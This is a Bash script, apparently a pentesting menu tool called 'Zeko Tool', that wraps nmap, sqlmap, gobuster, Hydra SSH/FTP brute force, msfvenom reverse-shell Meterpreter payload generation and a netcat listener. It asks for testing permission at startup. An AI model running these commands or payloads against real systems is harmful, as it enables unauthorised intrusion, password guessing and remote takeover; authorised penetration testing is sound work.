#!/usr/bin/env bash

set -euo pipefail
IFS=$'\n\t'

# -----------------------
# Colors & Globals
# -----------------------
RED="\e[31m"; GREEN="\e[32m"; YELLOW="\e[33m"; BLUE="\e[34m"; MAG="\e[35m"; CYAN="\e[36m"; RESET="\e[0m"
RESULTS_ROOT="./results"
TARGET_IP=""
LISTENER_IP=""
INTERFACE=""
SUBNET=""
TIMESTAMP="$(date +%Y%m%d_%H%M%S)"


TOOLS=(nmap masscan netdiscover gobuster nikto dirb wfuzz ffuf sqlmap hydra enum4linux sslscan whatweb rustscan searchsploit msfvenom msfconsole nc)

# -----------------------
# Banner
# -----------------------
show_banner(){
    clear
    echo -e "${CYAN}"
    echo "███████╗███████╗██╗  ██╗ ██████╗      ████████╗ ██████╗  ██████╗ ██╗     "
    echo "██╔════╝██╔════╝██║  ██║██╔═══██╗     ╚══██╔══╝██╔═══██╗██╔═══██╗██║     "
    echo "███████╗███████╗███████║██║   ██║        ██║   ██║   ██║██║   ██║██║     "
    echo "╚════██║╚════██║██╔══██║██║   ██║        ██║   ██║   ██║██║   ██║██║     "
    echo "███████║███████║██║  ██║╚██████╔╝        ██║   ╚██████╔╝╚██████╔╝███████╗"
    echo "╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝         ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝"
    echo -e "${RESET}"
    echo -e "${RED}================================================================${RESET}"
    echo -e "${RED}                        Z E K O   T O O L                       ${RESET}"
    echo -e "${RED}================================================================${RESET}"
    echo -e "${MAG}                 Developed by Mohamed Zakaria${RESET}"
    echo -e "${YELLOW}          Offensive Security | Automation | Pentesting Suite${RESET}"
    echo -e "${BLUE}          GitHub: https://github.com/MohamedZakria246/Zeko-Tool/${RESET}"
    echo ""
}

pause(){ read -rp "Press Enter to continue..."; }

# -----------------------
# Helpers
# -----------------------

# Detect interface and IP (best-effort)
detect_interface_and_ip(){
    if command -v ip >/dev/null 2>&1; then
        local iface ipaddr cidr
        iface=$(ip -o -4 addr show up primary scope global | awk '{print $2; exit}' || true)
        cidr=$(ip -o -4 addr show up primary scope global | awk '{print $4; exit}' || true)
        ipaddr=${cidr%%/*}
        if [[ -n "$iface" && -n "$ipaddr" ]]; then
            INTERFACE="$iface"
            LISTENER_IP="$ipaddr"
            SUBNET="$cidr"
        fi
    fi

    INTERFACE=${INTERFACE:-eth0}
    LISTENER_IP=${LISTENER_IP:-127.0.0.1}
    SUBNET=${SUBNET:-"${LISTENER_IP%.*}.0/24"}
}

prepare_result_dir(){
    local tgt="$1"
    local dir="$RESULTS_ROOT/$tgt/$TIMESTAMP"
    mkdir -p "$dir"
    echo "$dir"
}

# Function to detect the package manager
get_package_manager(){
    if command -v apt >/dev/null 2>&1; then
        echo "apt"
    elif command -v dnf >/dev/null 2>&1; then
        echo "dnf"
    elif command -v yum >/dev/null 2>&1; then
        echo "yum"
    else
        echo "unknown"
    fi
}

# ----------------------------------------------------
# FIXED: Universal installer helper with better robustness
# ----------------------------------------------------
install_tool(){
    local tool="$1"
    local pkg_manager=$(get_package_manager)
    local pkg="$tool"
    local update_cmd=""
    local install_cmd=""

    # 1. Tool-to-Package Name Mapping
    case "$tool" in
        msfconsole|msfvenom)
            pkg="metasploit-framework"
            ;;
        nc)
            # Use netcat-openbsd for apt for better features, or just netcat for others
            pkg=$([ "$pkg_manager" = "apt" ] && echo "netcat-openbsd" || echo "netcat")
            ;;
        searchsploit)
            pkg="exploitdb" # The package that provides searchsploit is exploitdb
            ;;
        *)
            pkg="$tool"
            ;;
    esac

    # 2. Package Manager Logic
    case "$pkg_manager" in
        apt)
            update_cmd="sudo apt update"
            install_cmd="sudo apt install -y $pkg"
            ;;
        dnf)
            update_cmd="sudo dnf check-update"
            install_cmd="sudo dnf install -y $pkg"
            ;;
        yum)
            update_cmd="sudo yum check-update"
            install_cmd="sudo yum install -y $pkg"
            ;;
        unknown)
            echo -e "${RED}Error: Cannot find apt, dnf, or yum. Please install '$tool' manually.${RESET}"
            return 1
            ;;
    esac

    echo -e "${BLUE}Attempting to install package: $pkg using $pkg_manager${RESET}"
    echo -e "${YELLOW}Commands: $update_cmd && $install_cmd${RESET}"
    read -rp "Continue? (y/N): " ok
    if [[ "$ok" =~ ^[Yy]$ ]]; then
        if [[ "$pkg_manager" != "unknown" ]]; then
            echo -e "${BLUE}Running update...${RESET}"
            # Use eval for reliable execution of the package manager command, allowing quiet failure
            eval "$update_cmd" 2>/dev/null || true
            
            echo -e "${BLUE}Running install...${RESET}"
            # Use eval again and check the exit status explicitly
            if eval "$install_cmd"; then
                echo -e "${GREEN}Successfully installed $pkg.${RESET}"
            else
                # If installation fails, return an error status
                echo -e "${RED}Installation of $pkg failed. Please check your package repositories and try manually.${RESET}"
                return 1
            fi
        fi
    else
        echo "Aborted installation of $pkg."
        return 1
    fi
}

# The check_tools function now uses the multi-distro install_tool
check_tools(){
    echo -e "${BLUE}Checking availability of penetration testing tools...${RESET}"
    missing=()
    available=()
    for t in "${TOOLS[@]}"; do
        if command -v "$t" >/dev/null 2>&1; then
            available+=("$t")
        else
            missing+=("$t")
        fi
    done

    echo -e "${GREEN}Available:${RESET} ${available[*]:-None}"
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${YELLOW}Missing (optional):${RESET} ${missing[*]}"
        read -rp "Do you want to attempt to install missing tools now? (y/N): " ans
        if [[ "$ans" =~ ^[Yy]$ ]]; then
            for tool in "${missing[@]}"; do
                # Check status of install_tool to only pause on failure
                install_tool "$tool" || pause
            done
        fi
    fi
    pause
}


# New: set target manually without discovery
set_target_manual(){
    read -rp "Enter target IP or hostname (or press Enter to cancel): " tin
    if [[ -n "$tin" ]]; then
        TARGET_IP="$tin"
        echo -e "${GREEN}Target set to: $TARGET_IP${RESET}"
    else
        echo "No change."
    fi
    pause
}

# Core: confirm and run with option to show or save output
confirm_and_run(){
    local cmd="$1"
    local outfile_base="${2:-}"
    local outdir=""

    echo
    echo -e "${MAG}Command:${RESET}"
    echo -e "${BLUE}$cmd${RESET}"
    echo

    # Before running, check if the primary command/tool exists; offer to install if missing
    local first_token
    # Safely extract the first non-sudo command token
    first_token=$(echo "$cmd" | sed -E 's/^\s*sudo\s+//; s/\s.*$//')

    if ! command -v "$first_token" >/dev/null 2>&1; then
        echo -e "${YELLOW}Tool '$first_token' is not installed.${RESET}"
        read -rp "Do you want to attempt to install '$first_token' now? (y/N): " install_ans
        if [[ "$install_ans" =~ ^[Yy]$ ]]; then
            # Run install_tool and check its exit status
            if install_tool "$first_token"; then
                if ! command -v "$first_token" >/dev/null 2>&1; then
                    echo -e "${RED}Installation succeeded, but '$first_token' is still not in PATH. You may need to restart your terminal or install it manually.${RESET}"
                    pause
                    return
                else
                    echo -e "${GREEN}Installed '$first_token'. Proceeding...${RESET}"
                fi
            else
                echo -e "${RED}Installation failed. Cannot run command.${RESET}"
                pause
                return
            fi
        else
            echo -e "${YELLOW}Skipping command because required tool is missing.${RESET}"
            pause
            return
        fi
    fi

    echo "Choose execution mode:"
    echo "  1) Show output only (no save)"
    echo "  2) Save output to file and show on terminal"
    echo "  3) Save output to file (do not tee to terminal)"
    echo "  4) Skip / Cancel"
    read -rp "Mode [1]: " mode
    mode=${mode:-1}

    case "$mode" in
        1)
            echo -e "${YELLOW}Running (show-only). Output will NOT be saved.${RESET}"
            # Use 'eval' to correctly handle arguments and sudo
            eval "$cmd"
            ;;
        2)
            if [[ -z "${TARGET_IP}" ]]; then
                read -rp "No target set. Provide a name to store results under: " tgtname
                tgtname=${tgtname:-unspecified}
            else
                tgtname="$TARGET_IP"
            fi
            outdir=$(prepare_result_dir "$tgtname")
            if [[ -n "$outfile_base" ]]; then
                outfile="$outdir/${outfile_base}.txt"
            else
                outfile="$outdir/command_$(date +%s).txt"
            fi
            echo -e "${GREEN}Saving to: $outfile${RESET}"
            # Run, capturing both stdout and stderr, then tee to file and terminal
            eval "$cmd" 2>&1 | tee "$outfile"
            ;;
        3)
            if [[ -z "${TARGET_IP}" ]]; then
                read -rp "No target set. Provide a name to store results under: " tgtname
                tgtname=${tgtname:-unspecified}
            else
                tgtname="$TARGET_IP"
            fi
            outdir=$(prepare_result_dir "$tgtname")
            if [[ -n "$outfile_base" ]]; then
                outfile="$outdir/${outfile_base}.txt"
            else
                outfile="$outdir/command_$(date +%s).txt"
            fi
            echo -e "${GREEN}Saving to: $outfile (silent)${RESET}"
            # Run, capturing both stdout and stderr to the file silently
            eval "$cmd" > "$outfile" 2>&1
            echo -e "${GREEN}Saved.${RESET}"
            ;;
        4)
            echo "Skipped execution."
            ;;
        *)
            echo "Invalid selection. Skipping."
            ;;
    esac
    pause
}

# -----------------------
# Menus (updated and consolidated)
# -----------------------
configure_network(){
    show_banner
    echo -e "${BLUE}Network Configuration${RESET}"
    detect_interface_and_ip
    echo -e "${GREEN}Auto-detected interface:${RESET} $INTERFACE"
    echo -e "${GREEN}Auto-detected listener IP:${RESET} $LISTENER_IP"
    echo -e "${GREEN}Auto-detected subnet:${RESET} $SUBNET"
    echo ""
    read -rp "Change interface (or press Enter to keep $INTERFACE): " iin
    INTERFACE=${iin:-$INTERFACE}
    read -rp "Change listener IP (or Enter to keep $LISTENER_IP): " lip
    LISTENER_IP=${lip:-$LISTENER_IP}
    read -rp "Change subnet (or Enter to keep $SUBNET): " ssub
    SUBNET=${ssub:-$SUBNET}
    echo -e "${GREEN}Configured: Interface=$INTERFACE Listener=$LISTENER_IP Subnet=$SUBNET${RESET}"
    pause
}

discover_targets(){
    show_banner
    echo -e "${BLUE}TARGET DISCOVERY${RESET}"
    echo "Subnet: $SUBNET"
    echo
    if command -v netdiscover >/dev/null 2>&1; then
        echo -e "${GREEN}Running netdiscover (ARP sweep) on $SUBNET...${RESET}"
        confirm_and_run "sudo netdiscover -r $SUBNET -P" "netdiscover"
    else
        echo -e "${YELLOW}netdiscover not installed. Using nmap -sn instead.${RESET}"
        confirm_and_run "nmap -sn $SUBNET" "nmap_ping"
    fi

    read -rp "Enter target IP to set (or press Enter to keep current: ${TARGET_IP:-unset}): " tin
    if [[ -n "$tin" ]]; then
        TARGET_IP="$tin"
        echo -e "${GREEN}Target set to: $TARGET_IP${RESET}"
    fi
    pause
}

port_scanning_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}PORT SCANNING${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) Quick Nmap (top 100 ports)"
        echo "2) Nmap Full TCP Scan (-p- -T4)"
        echo "3) Nmap Aggressive (-A) + Service/Version (-sV)"
        echo "4) Nmap UDP Scan (top 50 ports)"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -sC -sV --top-ports 100 $TARGET_IP" "nmap_quick"
                ;;
            2)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -p- -T4 $TARGET_IP" "nmap_allports"
                ;;
            3)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nmap -A -Pn $TARGET_IP" "nmap_aggressive"
                ;;
            4)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "sudo nmap -sU --top-ports 50 $TARGET_IP" "nmap_udp"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

# New/Combined Web Testing & Fuzzing Menu
web_and_fuzzing_menu(){
    local wordlist="/usr/share/wordlists/dirb/common.txt"
    if [[ ! -f "$wordlist" ]]; then
        # Fallback to a common rockyou.txt location if dirb/common.txt is missing
        wordlist="/usr/share/wordlists/rockyou.txt" 
        if [[ ! -f "$wordlist" ]]; then
            echo -e "${YELLOW}Warning: Wordlist $wordlist not found. Using a smaller list for demonstration.${RESET}"
            wordlist="/usr/share/dirb/wordlists/common.txt" # Common Kali/Parrot location
            if [[ ! -f "$wordlist" ]]; then
                echo -e "${RED}FATAL: No common wordlist found. Some tools may fail.${RESET}"
                wordlist="WORDLIST_FILE_MISSING"
            fi
        fi
        echo -e "${YELLOW}Note: Wordlist path adjusted to: $wordlist${RESET}"
    fi

    while true; do
        show_banner
        echo -e "${BLUE}WEB TESTING & FUZZING${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) Gobuster dir (Common list)"
        echo "2) FFUF (Fast Web Fuzzing)"
        echo "3) Dirb (Standard Directory Scanning)"
        echo "4) Nikto (Web Server Scan)"
        echo "5) SQLMap (SQL Injection, requires full URL)"
        echo "9) Back"
        read -rp "Choose: " w
        case "$w" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                [[ "$wordlist" == "WORDLIST_FILE_MISSING" ]] && { echo -e "${RED}Wordlist missing. Cannot run.${RESET}"; pause; continue; }
                confirm_and_run "gobuster dir -u http://$TARGET_IP -w $wordlist -t 30" "gobuster"
                ;;
            2)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set target first.${RESET}"; pause; continue; }
                [[ "$wordlist" == "WORDLIST_FILE_MISSING" ]] && { echo -e "${RED}Wordlist missing. Cannot run.${RESET}"; pause; continue; }
                read -rp "Enter path for FFUF (e.g. /FUZZ.html or /page.php?id=FUZZ): " ppath
                [[ -z "$ppath" ]] && { echo -e "${RED}Path required.${RESET}"; pause; continue; }
                confirm_and_run "ffuf -u http://$TARGET_IP$ppath -w $wordlist -t 50 -recursion" "ffuf_fuzz"
                ;;
            3)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                [[ "$wordlist" == "WORDLIST_FILE_MISSING" ]] && { echo -e "${RED}Wordlist missing. Cannot run.${RESET}"; pause; continue; }
                confirm_and_run "dirb http://$TARGET_IP $wordlist" "dirb"
                ;;
            4)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "nikto -h http://$TARGET_IP" "nikto"
                ;;
            5)
                read -rp "Enter full vulnerable URL (e.g. http://$TARGET_IP/page.php?id=1): " url
                [[ -z "$url" ]] && { echo -e "${RED}URL required.${RESET}"; pause; continue; }
                confirm_and_run "sqlmap -u '$url' --batch --random-agent" "sqlmap"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

# New Menu: Brute Force
brute_force_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}BRUTE FORCE (HYDRA)${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) FTP Login Brute Force (hydra)"
        echo "2) SSH Login Brute Force (hydra)"
        echo "9) Back"
        read -rp "Choose: " b
        case "$b" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                read -rp "Enter user list path (e.g., /usr/share/wordlists/metasploit/unix_users.txt): " userlist
                read -rp "Enter password list path (e.g., /usr/share/wordlists/rockyou.txt): " passlist
                confirm_and_run "hydra -L $userlist -P $passlist $TARGET_IP ftp" "hydra_ftp"
                ;;
            2)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                read -rp "Enter user list path (e.g., /usr/share/wordlists/metasploit/unix_users.txt): " userlist
                read -rp "Enter password list path (e.g., /usr/share/wordlists/rockyou.txt): " passlist
                confirm_and_run "hydra -L $userlist -P $passlist $TARGET_IP ssh" "hydra_ssh"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}


# New Menu: Advanced Utilities/Scanning
advanced_tools_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}ADVANCED/UTILITY TOOLS${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET}"
        echo
        echo "1) RustScan (Fast Port Discovery -> Nmap)"
        echo "2) Searchsploit (ExploitDB Search)"
        echo "3) SSLScan (TLS/SSL Info)"
        echo "4) Enum4linux (SMB/Samba Enumeration)"
        echo "5) WhatWeb (Web Fingerprinting)"
        echo "9) Back"
        read -rp "Choose: " a
        case "$a" in
            1)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                echo -e "${YELLOW}RustScan will pipe open ports into an Nmap service scan.${RESET}"
                confirm_and_run "rustscan -a $TARGET_IP -- -sC -sV" "rustscan_nmap"
                ;;
            2)
                read -rp "Enter search term (e.g., 'apache 2.4.2'): " term
                [[ -z "$term" ]] && { echo -e "${RED}Search term required.${RESET}"; pause; continue; }
                confirm_and_run "searchsploit \"$term\"" "searchsploit_${term// /_}"
                ;;
            3)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                # Assume port 443 by default for SSL/TLS
                confirm_and_run "sslscan $TARGET_IP:443" "sslscan"
                ;;
            4)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "enum4linux -a $TARGET_IP" "enum4linux"
                ;;
            5)
                [[ -z "$TARGET_IP" ]] && { echo -e "${RED}Set a target first.${RESET}"; pause; continue; }
                confirm_and_run "whatweb -v http://$TARGET_IP" "whatweb"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}


payload_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}PAYLOAD GENERATION (MSFVENOM)${RESET}"
        echo "Listener IP: ${LISTENER_IP:-NOT SET}"
        echo "1) Windows Meterpreter (reverse_tcp, exe)"
        echo "2) Linux Meterpreter (reverse_tcp, elf)"
        echo "3) PHP meterpreter (reverse_tcp, raw)"
        echo "9) Back"
        read -rp "Choose: " p
        case "$p" in
            1)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f exe -o windows_rev_${lport}.exe" "msf_win"
                ;;
            2)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f elf -o linux_rev_${lport}.elf" "msf_lin"
                ;;
            3)
                read -rp "Enter LPORT (default 4444): " lport
                lport=${lport:-4444}
                confirm_and_run "msfvenom -p php/meterpreter_reverse_tcp LHOST=$LISTENER_IP LPORT=$lport -f raw -o php_rev_${lport}.php" "msf_php"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

exploitation_menu(){
    while true; do
        show_banner
        echo -e "${BLUE}EXPLOITATION / LISTENERS${RESET}"
        echo "Listener IP: ${LISTENER_IP:-NOT SET}"
        echo "1) Start msfconsole (interactive)"
        echo "2) Netcat listener (4444)"
        echo "9) Back"
        read -rp "Choose: " e
        case "$e" in
            1)
                echo -e "${YELLOW}Launching msfconsole...${RESET}"
                confirm_and_run "msfconsole" "msfconsole"
                ;;
            2)
                read -rp "Enter Netcat listen port (default 4444): " ncport
                ncport=${ncport:-4444}
                confirm_and_run "nc -nlvp $ncport -s $LISTENER_IP" "nc_listener_$ncport"
                ;;
            9) break ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

# Final main menu update
main_menu(){
    while true; do
        show_banner
        echo -e "${GREEN}MAIN MENU${RESET}"
        echo "Target: ${TARGET_IP:-NOT SET} | Listener: ${LISTENER_IP:-NOT SET} | Interface: ${INTERFACE:-NOT SET}"
        echo
        echo "1) Configure Network"
        echo "2) Set Target Manually"
        echo "3) Discover Targets (netdiscover/nmap -sn)"
        echo "4) Port Scanning (Nmap)"
        echo "5) Web Testing & Fuzzing (Gobuster, FFUF, Nikto, SQLMap)"
        echo "6) Brute Force (Hydra)"
        echo "7) Payload Generation (MSFVenom)"
        echo "8) Exploitation / Listeners (MSFConsole, Netcat)"
        echo "9) Advanced Utilities/Scanning (RustScan, Searchsploit, Enum4linux, SSLScan)"
        echo "0) Exit"
        read -rp "Choose: " opt
        case "$opt" in
            1) configure_network ;;
            2) set_target_manual ;;
            3) discover_targets ;;
            4) port_scanning_menu ;;
            5) web_and_fuzzing_menu ;;
            6) brute_force_menu ;;
            7) payload_menu ;;
            8) exploitation_menu ;;
            9) advanced_tools_menu ;;
            0) echo "Bye."; exit 0 ;;
            *) echo "Invalid"; sleep 1 ;;
        esac
    done
}

# -----------------------
# Startup
# -----------------------
trap 'echo; echo "Interrupted."; exit 1' INT TERM
show_banner

read -rp "Do you have explicit permission to test targets? (yes/no): " perm
if [[ ! "$perm" =~ ^(yes|y|Y)$ ]]; then
    echo -e "${RED}Permission required. Exiting.${RESET}"
    exit 1
fi

detect_interface_and_ip
main_menu